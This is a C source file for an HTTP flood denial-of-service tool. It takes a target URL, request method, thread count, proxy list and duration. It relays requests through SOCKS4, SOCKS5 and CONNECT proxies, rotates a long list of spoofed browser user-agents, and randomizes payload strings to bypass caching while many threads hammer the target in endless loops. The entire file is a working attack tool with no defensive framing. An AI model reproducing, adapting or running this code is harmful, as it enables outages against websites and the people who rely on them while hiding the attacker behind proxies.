#include <pthread.h>
#include <sys/resource.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <netinet/in.h>
#include <ctype.h>

#define RND_CHAR (char)((rand() % 26)+97)

char *useragents[] = {
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0 RestSharp 102.0.0.0",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
	"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.2.15 Version/10.00",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; )",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_5; en-us) AppleWebKit/525.26.2 (KHTML, like Gecko) Version/3.2 Safari/525.26.12",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; cs; rv:1.9.0.5) Gecko/2009021916 Songbird/1.1.2 (20090331142126)",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 6_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
	"Mozilla/5.0 (X11; U; Linux; cs-CZ) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3)  rekonq",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows XP 5.1) Lobo/0.98.4",
	"X-Smiles/1.2-20081113",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9) Gecko/2008120120 Blackbird/0.9991",
	"Mozilla/5.0 (SCH-F859/F859DG12;U;NUCLEUS/2.1;Profile/MIDP-2.1 Configuration/CLDC-1.1;480*800;CTC/2.0) Dolfin/2.0",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.10) Gecko/20100914 Conkeror/0.9.3",
	"LeechCraft (X11; U; Linux; ru_RU) (LeechCraft/Poshuku 0.3.55-324-g9365f23; WebKit 4.5.2/4.5.2)",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1.8) Gecko/20100317 Postbox/1.1.3",
	"xine/1.1.16.3",
	"Bunjalloo/0.7.6(Nintendo DS;U;en)",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; SkipStone 0.8.3) Gecko/20020615 Debian/1.0.0-3 ",
	"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
	"MMozilla/5.0 (Windows; U; Windows NT 6.1; cs-CZ) AppleWebKit/533.3 (KHTML, like Gecko) QupZilla/1.1.5 Safari/533.3",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
	"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
	"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
	"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
};
#define ATTACKPORT 80
char *postformat = "%s /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: #useragent#\r\nConnection: close\r\nAccept-Encoding: gzip, deflate\r\n%s\r\n%s";
char *postpayload;
struct urlparts {
	char * name;
	char separator[4];
	char value[128];
} parts[] = {
	{ "scheme", ":" },
	{ "userid", "@" },
	{ "password", ":" },
	{ "host", "//" },
	{ "port", ":" },
	{ "path", "/" },
	{ "param", ";" },
	/*{ "query", "?" },*/
	{ "fragment", "#" }
};
enum partnames { scheme = 0, userid, password, host, port, path, param, query, fragment } ;
#define NUMPARTS (sizeof parts / sizeof (struct urlparts))
struct urlparts *returnparts[8];
struct urllist { char *url; int done; struct urllist *next; struct urllist *prev; };
struct proxy { char *type; char *ip; int port; int working; };
struct list { struct proxy *data; char *useragent; struct list *next; struct list *prev; };
struct list *head = NULL;
char parseError[128];
int parseURL(char *url, struct urlparts **returnpart);
char * strsplit(char * s, char * tok);
char firstpunc(char *s);
int strleft(char * s, int n);
void setupparts();
void freeparts();
char *stristr(const char *String, const char *Pattern);
char *str_replace(char *orig, char *rep, char *with);
char *geturl(char *url, char *useragent, char *ip);
char *ipstr;
static int rps = 0;

void *flood(void *par) {
	struct list *startpoint = (struct list *)par;
	int i;
	struct sockaddr_in serverAddr;
	signal(SIGPIPE, SIG_IGN);
	while(1)
	{
		int sent = 0;
		if(startpoint->data->working == 0)
		{
			startpoint = startpoint->next;
			sleep(1);
			continue;
		}
		
		memset(&serverAddr, 0, sizeof(serverAddr));
		serverAddr.sin_family = AF_INET;
		serverAddr.sin_port = htons(startpoint->data->port);
		serverAddr.sin_addr.s_addr = inet_addr(startpoint->data->ip);
		int serverSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		u_int yes=1;
		if (setsockopt(serverSocket,SOL_SOCKET,SO_REUSEADDR,&yes,sizeof(yes)) < 0) {}
		if(connect(serverSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) > 0)
		{
			startpoint->data->working = 0;
			startpoint = startpoint->next;
			continue;
		}
		if(strcmp(startpoint->data->type, "Socks4")==0)
		{
			unsigned char buf[10];
			buf[0] = 0x04;
			buf[1] = 0x01;
			*(unsigned short*)&buf[2] = htons(ATTACKPORT);
			*(unsigned long*)&buf[4] = inet_addr(ipstr);
			buf[8] = 0x00;
			if(send(serverSocket, buf, 9, MSG_NOSIGNAL) != 9)
			{
				startpoint->data->working = 0;
				startpoint = startpoint->next;
				close(serverSocket);
				continue;
			}
		}
		if(strcmp(startpoint->data->type, "Socks5")==0)
		{
			unsigned char buf[20];
			buf[0] = 0x05;
			buf[1] = 0x01;
			buf[2] = 0x00;
			if((sent = send(serverSocket, buf, 3, MSG_NOSIGNAL)) < 0)
			{
				startpoint->data->working = 0;
				startpoint = startpoint->next;
				close(serverSocket);
				continue;
			}
			buf[0] = 0x05;
			buf[1] = 0x01;
			buf[2] = 0x00;
			buf[3] = 0x01;
			*(unsigned long*)&buf[4] = inet_addr(ipstr);
			*(unsigned short*)&buf[8] = htons(ATTACKPORT);
			if((sent = send(serverSocket, buf, 10, MSG_NOSIGNAL)) < 0)
			{
				startpoint->data->working = 0;
				startpoint = startpoint->next;
				close(serverSocket);
				continue;
			}
		}
		if(strcmp(startpoint->data->type, "CONNECT") == 0 || strcmp(startpoint->data->type, "TUNNEL") == 0)
		{
			char *connectrequest = malloc(1024);
			bzero(connectrequest, 1024);
			sprintf(connectrequest, "CONNECT %s:25565 HTTP/1.0\r\n\r\n", ipstr);
			if((sent = send(serverSocket, connectrequest, strlen(connectrequest), MSG_NOSIGNAL)) < 0)
			{
				startpoint->data->working = 0;
				startpoint = startpoint->next;
				close(serverSocket);
				continue;
			}
			char *recvbuf = malloc(1024);
			bzero(recvbuf, 1024);
			int gotbytes = recv(serverSocket, recvbuf, 1024, 0);
			if(gotbytes < 1)
			{
				startpoint->data->working = 0;
				startpoint = startpoint->next;
				close(serverSocket);
				continue;
			}
			free(recvbuf);
		}
		char *httppayload = str_replace(postpayload, "#useragent#", startpoint->useragent);
		if(httppayload == NULL)
		{
			startpoint = startpoint->next;
			close(serverSocket);
			continue;
		}
		char *tmp = NULL;
		while((tmp = strstr(httppayload, "%RANDOM%"))!=NULL)
		{
			*(tmp) = RND_CHAR;
			*(tmp+1) = RND_CHAR;
			*(tmp+2) = RND_CHAR;
			*(tmp+3) = RND_CHAR;
			*(tmp+4) = RND_CHAR;
			*(tmp+5) = RND_CHAR;
			*(tmp+6) = RND_CHAR;
			*(tmp+7) = RND_CHAR;
		}
		send(serverSocket, httppayload, strlen(httppayload), MSG_NOSIGNAL);
		free(httppayload);
		close(serverSocket);
		rps++;
		usleep(50000);
		//startpoint = startpoint->next;
	}
}

int main(int argc, char *argv[ ]) {
	if(argc < 6){
		fprintf(stderr, "Invalid parameters!\n");
		fprintf(stdout, "Usage: %s <target url> <method (GET or HEAD or POST)> <number threads to use> <proxy list> <time> [manual ip (0 to disable)] [post parameters (%RANDOM% will be replaced with random shit)]\n", argv[0]);
		exit(-1);
	}
	//fprintf(stdout, "Setting up Sockets...\n");
	int num_threads = atoi(argv[3]);
	char *method = argv[2];
	if(!(strcmp(method, "GET")==0 || strcmp(method, "HEAD")==0|| strcmp(method, "POST")==0))
	{
		fprintf(stderr, "Invalid parameters!\n");
		fprintf(stdout, "Usage: %s <target url> <method (GET or HEAD or POST)> <number threads to use> <proxy list> <time> [manual ip (0 to disable)] [post parameters (%RANDOM% will be replaced with random shit)]\n", argv[0]);
		exit(-1);
	}
	FILE *pFile = fopen(argv[4], "rb");
	if(pFile==NULL)
	{
		perror("fopen"); exit(1);
	}
	fseek(pFile, 0, SEEK_END);
	long lSize = ftell(pFile);
	rewind(pFile);
	char *buffer = (char *)malloc(lSize*sizeof(char));
	fread(buffer, 1, lSize, pFile);
	fclose (pFile);
	int i=0;
	char *pch = (char *)strtok(buffer, ":");
	while(pch != NULL)
	{
		if(head == NULL)
		{
			head = (struct list *)malloc(sizeof(struct list));
			bzero(head, sizeof(struct list));
			head->data = (struct proxy *)malloc(sizeof(struct proxy));
			bzero(head->data, sizeof(struct proxy));
			head->data->working = 1;
			head->data->ip = malloc(strlen(pch)+1); strcpy(head->data->ip, pch);
			pch = (char *)strtok(NULL, ":");
			if(pch == NULL) exit(-1);
			head->data->port = atoi(pch);
			pch = (char *)strtok(NULL, ":");
			head->data->type = malloc(strlen(pch)+1); strcpy(head->data->type, pch);
			pch = (char *)strtok(NULL, ":");
			head->useragent = useragents[rand() % (sizeof(useragents)/sizeof(char *))];
			head->next = head;
			head->prev = head;
		} else {
			struct list *new_node = (struct list *)malloc(sizeof(struct list));
			bzero(new_node, sizeof(struct list));
			new_node->data = (struct proxy *)malloc(sizeof(struct proxy));
			bzero(new_node->data, sizeof(struct proxy));
			new_node->data->working = 1;
			new_node->data->ip = malloc(strlen(pch)+1); strcpy(new_node->data->ip, pch);
			pch = (char *)strtok(NULL, ":");
			if(pch == NULL) break;
			new_node->data->port = atoi(pch);
			pch = (char *)strtok(NULL, ":");
			new_node->data->type = malloc(strlen(pch)+1); strcpy(new_node->data->type, pch);
			pch = (char *)strtok(NULL, ":");
			new_node->useragent = useragents[rand() % (sizeof(useragents)/sizeof(char *))];
			new_node->prev = head;
			new_node->next = head->next;
			head->next = new_node;
		}
	}
	free(buffer);
	const rlim_t kOpenFD = 1024 + (num_threads * 2);
	struct rlimit rl;
	int result;
	rl.rlim_cur = kOpenFD;
	rl.rlim_max = kOpenFD;
	result = setrlimit(RLIMIT_NOFILE, &rl);
	if (result != 0)
	{
		perror("setrlimit");
		fprintf(stderr, "setrlimit returned result = %d\n", result);
	}
	bzero(&rl, sizeof(struct rlimit));
	rl.rlim_cur = 256 * 1024;
	rl.rlim_max = 4096 * 1024;
	result = setrlimit(RLIMIT_STACK, &rl);
	if (result != 0)
	{
		perror("setrlimit_stack");
		fprintf(stderr, "setrlimit_stack returned result = %d\n", result);
	}
	setupparts();
	parseURL(argv[1], returnparts);
	if(argc > 6 && !(strcmp(argv[6], "0") == 0))
	{
		ipstr = malloc(strlen(argv[6])+1);
		bzero(ipstr, strlen(argv[6])+1);
		strcpy(ipstr, argv[6]);
		//fprintf(stdout, "Using manual IP...\n");
	} else {
		struct hostent *he;
		struct in_addr a;
		he = gethostbyname(returnparts[host]->value);
		if (he)
		{
			while (*he->h_addr_list)
			{
				bcopy(*he->h_addr_list++, (char *) &a, sizeof(a));
				ipstr = malloc(INET_ADDRSTRLEN+1);
				inet_ntop (AF_INET, &a, ipstr, INET_ADDRSTRLEN);
				break;
			}
		}
		else
		{ herror("gethostbyname"); }
	}
	char *postdata = malloc(1);
	bzero(postdata, 1);
	char *extrahead = malloc(1);
	bzero(extrahead, 1);
	if(argc > 7)
	{
		//fprintf(stdout, "Using post parameters\n");
		postdata = argv[7];
		extrahead = malloc(4096);
		bzero(extrahead, 4096);
		sprintf(extrahead, "Content-Length: %d\r\nContent-Type: application/x-www-form-urlencoded\r\n", strlen(postdata));
	}
	pthread_t thread[num_threads];
	postpayload = malloc(4096);
	sprintf(postpayload, postformat, method, returnparts[path]->value, returnparts[host]->value, extrahead, postdata);
	freeparts();
	
	//fprintf(stdout, "Starting Flood...\n");
	
	for(i = 0;i<num_threads;i++){
		pthread_create(&thread[i], NULL, &flood, (void *)head);
		pthread_detach(thread[i]);
		head = head->next;
		head = head->next;
                head = head->next;
                head = head->next;
		head = head->next;
	}
	
	int temp = atoi(argv[5]);
	
	for(i = 0;i<temp;i++)
	{
		sleep(1);
		//printf("R/s: %d\n", rps);
		//rps = 0;
	}
	return 0;
}
void freeparts()
{
	return;
	if(returnparts[0]!=NULL) { free(returnparts[0]); }
	if(returnparts[1]!=NULL) { free(returnparts[1]); }
	if(returnparts[2]!=NULL) { free(returnparts[2]); }
	if(returnparts[3]!=NULL) { free(returnparts[3]); }
	if(returnparts[4]!=NULL) { free(returnparts[4]); }
	if(returnparts[5]!=NULL) { free(returnparts[5]); }
	if(returnparts[6]!=NULL) { free(returnparts[6]); }
	if(returnparts[7]!=NULL) { free(returnparts[7]); }
	/*if(returnparts[8]!=NULL) { free(returnparts[8]); }*/
	return;
}
void setupparts()
{
	returnparts[0] = malloc(sizeof(struct urlparts));
	returnparts[1] = malloc(sizeof(struct urlparts));
	returnparts[2] = malloc(sizeof(struct urlparts));
	returnparts[3] = malloc(sizeof(struct urlparts));
	returnparts[4] = malloc(sizeof(struct urlparts));
	returnparts[5] = malloc(sizeof(struct urlparts));
	returnparts[6] = malloc(sizeof(struct urlparts));
	returnparts[7] = malloc(sizeof(struct urlparts));
	/*returnparts[8] = malloc(sizeof(struct urlparts));*/
	bzero(returnparts[0], sizeof(struct urlparts));
	bzero(returnparts[1], sizeof(struct urlparts));
	bzero(returnparts[2], sizeof(struct urlparts));
	bzero(returnparts[3], sizeof(struct urlparts));
	bzero(returnparts[4], sizeof(struct urlparts));
	bzero(returnparts[5], sizeof(struct urlparts));
	bzero(returnparts[6], sizeof(struct urlparts));
	bzero(returnparts[7], sizeof(struct urlparts));
	/*bzero(returnparts[8], sizeof(struct urlparts));*/
	returnparts[0]->name = "scheme";
	strcpy(returnparts[0]->separator, ":");
	returnparts[1]->name = "userid";
	strcpy(returnparts[1]->separator, "@");
	returnparts[2]->name = "password";
	strcpy(returnparts[2]->separator, ":");
	returnparts[3]->name = "host";
	strcpy(returnparts[3]->separator, "//");
	returnparts[4]->name = "port";
	strcpy(returnparts[4]->separator, ":");
	returnparts[5]->name = "path";
	strcpy(returnparts[5]->separator, "/");
	returnparts[6]->name = "param";
	strcpy(returnparts[6]->separator, ";");
	/*returnparts[7]->name = "query";
	strcpy(returnparts[7]->separator, "?");*/
	returnparts[7]->name = "fragment";
	strcpy(returnparts[7]->separator, "#");
	return;
}
int parseURL(char *url, struct urlparts **returnpart) {
	register i;
	int seplen;
	char * remainder;
	//char * regall = ":/;?#";
	char * regall = ":/;#";
	//char * regpath = ":;?#";
	char * regpath = ":;#";
	char * regx;
	if(!*url)
	{
		strcpy(parseError, "nothing to do!\n");
		return 0;
	}
	if((remainder = malloc(strlen(url) + 1)) == NULL)
	{
		printf("cannot allocate memory\n");
		exit(-1);
	}
	strcpy(remainder, url);
	if(firstpunc(remainder) == ':')
	{
		strcpy(returnpart[scheme]->value, strsplit(remainder, returnpart[scheme]->separator));
		strleft(remainder, 1);
	}
	if (!strcmp(returnpart[scheme]->value, "mailto"))
	*(returnpart[host]->separator) = 0;
	for(i = 0; i < NUMPARTS; i++)
	{
		if(!*remainder)
		break;
		if(i == scheme || i == userid || i == password)
		continue;
		if(i == host && strchr(remainder, '@'))
		{
			if(!strncmp(remainder, "//", 2))
			strleft(remainder, 2);
			strcpy(returnpart[userid]->value, strsplit(remainder, ":@"));
			strleft(remainder, 1);
			if(strchr(remainder, '@'))
			{
				strcpy(returnpart[password]->value, strsplit(remainder, "@"));
				strleft(remainder, 1);
			}
			*(returnpart[host]->separator) = 0;
		}
		if(i == path && (! *(returnpart[scheme]->value)))
		{
			*(returnpart[path]->separator) = 0;
			strcpy(returnpart[scheme]->value, "http");
		}
		regx = (i == path) ? regpath : regall ;
		seplen = strlen(returnpart[i]->separator);
		if(strncmp(remainder, returnpart[i]->separator, seplen))
		continue;
		else
		strleft(remainder, seplen);
		strcpy(returnpart[i]->value, strsplit(remainder, regx));
	}
	if(*remainder)
	sprintf(parseError, "I don't understand '%s'", remainder);
	free(remainder);
	return 0;
}
char *str_replace(char *orig, char *rep, char *with) {
	char *result; 
	char *ins;    
	char *tmp;    
	int len_rep;  
	int len_with; 
	int len_front; 
	int count;    
	if (!orig)
	return NULL;
	if (!rep || !(len_rep = strlen(rep)))
	return NULL;
	if (!(ins = strstr(orig, rep)))
	return NULL;
	if (!with)
	with = "";
	len_with = strlen(with);
	for (count = 0; tmp = strstr(ins, rep); ++count) {
		ins = tmp + len_rep;
	}
	tmp = result = malloc(strlen(orig) + (len_with - len_rep) * count + 1);
	if (!result)
	return NULL;
	while (count--) {
		ins = strstr(orig, rep);
		len_front = ins - orig;
		tmp = strncpy(tmp, orig, len_front) + len_front;
		tmp = strcpy(tmp, with) + len_with;
		orig += len_front + len_rep; 
	}
	strcpy(tmp, orig);
	return result;
}
char *stristr(const char *String, const char *Pattern)
{
	char *pptr, *sptr, *start;
	uint slen, plen;
	for (start = (char *)String,
	pptr = (char *)Pattern,
	slen = strlen(String),
	plen = strlen(Pattern);
	slen >= plen;
	start++, slen--)
	{
		
		while (toupper(*start) != toupper(*Pattern))
		{
			start++;
			slen--;
			
			if (slen < plen)
			return(NULL);
		}
		sptr = start;
		pptr = (char *)Pattern;
		while (toupper(*sptr) == toupper(*pptr))
		{
			sptr++;
			pptr++;
			
			if ('\0' == *pptr)
			return (start);
		}
	}
	return(NULL);
}
char * strsplit(char * s, char * tok) {
#define OUTLEN (255)
	register i, j;
	static char out[OUTLEN + 1];
	for(i = 0; s[i] && i < OUTLEN; i++)
	{
		if(strchr(tok, s[i]))
		break;
		else
		out[i] = s[i];
	}
	out[i] = 0;
	if(i && s[i])
	{
		for(j = 0; s[i]; i++, j++) s[j] = s[i];
		s[j] = 0;
	}
	else if (!s[i])
	*s = 0;
	return out;
}
char firstpunc(char * s) {
	while(*s++)
	if(!isalnum(*s)) return *s;
	return 0;
}
int strleft(char * s, int n) {
	int l;
	l = strlen(s);
	if(l < n)
	return -1;
	else if (l == n)
	*s = 0;
	memmove(s, s + n, l - n + 1);
	return n;
}